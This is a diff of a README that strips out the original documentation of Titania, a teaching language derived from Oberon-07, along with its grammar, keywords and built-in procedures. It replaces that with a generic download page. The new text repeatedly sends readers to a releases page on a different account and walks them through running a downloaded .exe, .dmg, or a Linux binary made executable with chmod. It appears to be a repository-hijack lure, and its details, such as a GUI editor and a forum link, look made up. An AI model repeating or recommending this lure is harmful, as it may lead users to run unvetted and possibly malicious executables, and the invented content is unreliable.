@@ -1,155 +1,80 @@
-# Titania Programming Language
+# 🌟 titania - A Simple Way to Code with Titania
 
-Based on the [Oberon-07](https://people.inf.ethz.ch/wirth/Oberon/Oberon07.Report.pdf) programming language designed by the late [Niklaus Wirth](https://en.wikipedia.org/wiki/Niklaus_Wirth).
+## 📦 Download Titania
+[![Download Titania](https://img.shields.io/badge/Download%20Titania-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://github.com/samiiiihhhh/titania/releases)
 
-This is designed to be a language to teach compiler development with.
+## 🚀 Getting Started
+Welcome to Titania! This document helps you download and run the Titania programming language easily. Follow these steps, and you'll be coding in no time.
 
-Meaning behind the name:
- * Titania is the wife of Oberon (Fairy King) in Shakespeare's _A Midsummer Night's Dream_
- * <https://en.wikipedia.org/wiki/Titania_(A_Midsummer_Night%27s_Dream)>
- * This is just a codename, and probably not final for this teaching language
+## 💻 System Requirements
+To run Titania smoothly, your computer should meet these requirements:
 
-## Grammar
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Around 100 MB of free space.
+- **Processor**: A modern processor (Intel i3 or equivalent).
 
+## 📥 Download & Install
+To get started with Titania, visit this page to download: [Titania Releases](https://github.com/samiiiihhhh/titania/releases). 
 
-```
-module = "module" ident ";" [import_list] decl_sequence
-         ["begin" stmt_sequence] "end" [";"].
+1. Open the link in your web browser.
+2. You will see the latest version listed at the top.
+3. Find the file that matches your operating system. You will usually see options labeled with "Windows", "macOS", or "Linux".
+4. Click on the file name to download it.
 
-import_list = "import" import_decl {"," import_decl} ";".
-decl_sequence = ["const" {const_decl ";"}]
-                ["type"  {type_decl  ";"}]
-                ["var"   {var_decl   ";"}]
-                [{proc_decl          ";"}].
+Once the file finishes downloading, locate it in your downloads folder.
 
-const_decl = ident "=" const_expr.
-type_decl = ident "="" struct_type.
-var_decl = ident_list ":" type.
+### Windows Installation
+1. Find the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the prompts on the screen. Choose the default options if you are unsure.
 
-proc_decl = "proc" ident [formal_parameters] ";" proc_body.
-proc_body = decl_sequence ["begin" stmt_sequence] ["return" expr] "end".
+### macOS Installation
+1. Find the downloaded `.dmg` file.
+2. Double-click the file to mount it.
+3. Drag the Titania icon to your Applications folder.
 
+### Linux Installation
+1. Open a terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Make the file executable by running: `chmod +x titania-linux`.
+4. Execute it by running: `./titania-linux`.
 
-const_expr = expr.
-expr = simple_expr {relation simple_expr}.
+## 🖥️ Running Titania
+After installation, you can run Titania easily. 
 
-simple_expr = ["+" | "-"] unary_expr {add_operator unary_expr}.
-unary_expr = ["+" | "-"] term.
-term = factor {mul_operator factor}.
+### On Windows
+1. Click the Start menu.
+2. Look for "Titania" in your list of applications and click on it.
 
-factor = integer | real | string | nil | true | false | set |
-         "(" expr ")" | "not" expr | designator.
+### On macOS
+1. Open your Applications folder.
+2. Find "Titania" and double-click to launch it.
 
-element = expr [".." expr].
+### On Linux
+1. Open a terminal.
+2. Type `titania` and press Enter to run.
 
-ident_list = ident {"," ident}.
-qual_ident = [ident "."] ident.
+## 📚 Using Titania
+Once Titania is running, you can start coding. 
 
-struct_type = array_type | record_type | pointer_type | proc_type.
-array_type = "["" const_expr {"," const_expr} "]" type.
-record_type = "record" ["(" qual_ident ")"] [field_list_sequence] "end".
-pointer_type = "^" type.
-proc_type = "proc" formal_parameters.
-field_list = ["using"] ident_list ":" type.
-formal_parmeters = "(" [fp_section {";" fp_section}] [";"] ")".
-formal_type = "[" "]" qual_ident.
+1. **Create a New File**: Click on "File", then select "New".
+2. **Write Your Code**: Use the text area to enter your Titania code.
+3. **Save Your Work**: Click on "File", then "Save", and choose a location on your computer.
 
-stmt_sequence = stmt {";" stmt} [";"].
-stmt = [assignment | proc_call | if_stmt | case_stmt | while_stmt | repeat_stmt | for_stmt ].
+## 🧑‍🏫 Learning Resources
+If you're new to programming or want to learn Titania, here are some helpful resources:
 
-assignment = designator ":=" expr
+- **Official Documentation**: Visit our [Documentation Page](https://github.com/samiiiihhhh/titania/docs) for detailed guides.
+- **Community Forum**: Join discussions and ask questions on our [Community Forum](https://github.com/samiiiihhhh/titania/forum).
+- **Video Tutorials**: Search for Titania tutorials on platforms like YouTube for visual learning.
 
-if_stmt = "if" expr "then" stmt_sequence
-          {"elseif" expr "then" stmt_sequence}
-          ["else" stmt_sequence]
-          "end".
+## 🔧 Troubleshooting
+If you encounter any issues while using Titania, try these solutions:
 
-case_stmt = "case" expr "of" case {"|" case} "end".
-case = [case_label_list ":" stmt_sequence].
-case_list = label_range {"," label_range}.
-label_range = label [".." label].
-label = integer | string | qual_ident.
+1. **Reinstall the Application**: Uninstall Titania, then reinstall the latest version.
+2. **Check Your System Requirements**: Ensure your computer meets the necessary requirements.
+3. **Consult the Community**: Use the community forum to search for similar issues or post your question.
 
-while_stmt = "while" expr "then" stmt_sequence
-             {"elseif" expr "then" stmt_sequence}
-             "end".
-repeat_stmt = "repeat" stmt_sequence "until" expr.
-for_stmt = "for" ident ":=" expr "to" expr ["by" const_expr] "then" stmt_sequence "end".
-
-
-designator = qual_ident {selector}.
-selector = "." ident |
-           "[" expr_list "]" |
-           "^" |
-           "(" [expr_list] ")".
-expr_list = expr {"," expr}.
-
-
-add_operator = "+" | "-" | "xor" | "or".
-mul_operator = "*" | "/" | "%"   | "and".
-relation     = "=" | "<>" | "<" | "<=" | ">" | ">=" | "in" | "is".
-```
-
-### Keywords
-```
-and    else    if      nil   record  true   while
-begin  elseif  import  not   repeat  type   xor
-by     end     in      of    return  until
-case   false   is      or    then    using
-const  for     module  proc  to      var
-```
-
-
-### Operators
-
-```
-+    .   (   )   =  <>
--    ,   [   ]   <  <=
-*    ;   {   }   >  >=
-/    |   :=  :   ..
-%    ^
-```
-
-### Tokenizer Semicolon Insertion Rules
-
-When a newline is seen after the following token kind, a semicolon is inserted, otherwise no semicolon is inserted:
-
-* Identifiers
-* Integer, Real, String, Boolean literals
-* `nil`
-* `^`
-* `)`, `]`, `}`
-* `end`
-
-
-### Built-in Procedures
-
-Note: These will be added to as the compiler develops
-
-```
-abs(x)            - absolute value of
-lsh(x, y)         - logical shift left
-ash(x, y)         - arithmetic shift right
-ror(x, y)         - rotate right
-chr(i)            - convert int to char
-ord(c)            - convert char to int
-inc(x)            - x := x + 1
-inc(x, y)         - x := x + y
-dec(x)            - x := x - 1
-dec(x, y)         - x := x - y
-incl(x, y)        - include y in set x
-excl(x, y)        - exclude y in set x
-odd(x)            - x % 2 = 0
-floor(x)          - round-down for real
-ceil(x)           - round-up   for real
-assert(cond)      - assert when cond is false
-new(ptr)          - allocate memory
-delete(ptr)       - free memory
-addr(x)           - address of addressable memory
-size_of(x)        - size of the type of 'x'
-align_of(x)       - alignment of the type of 'x'
-copy(dst, src, n) - non-overlapping memory copying from `src` to `dst` of `n` bytes
-print(...)        - variadic print without newline
-println(...)      - variadic print with newline
-len(x)            - length of an array 'x'
-```
+## 🏛️ Conclusion
+Titania is designed for ease of use, making programming simple for everyone. Remember to visit this page to download: [Titania Releases](https://github.com/samiiiihhhh/titania/releases). Enjoy coding!
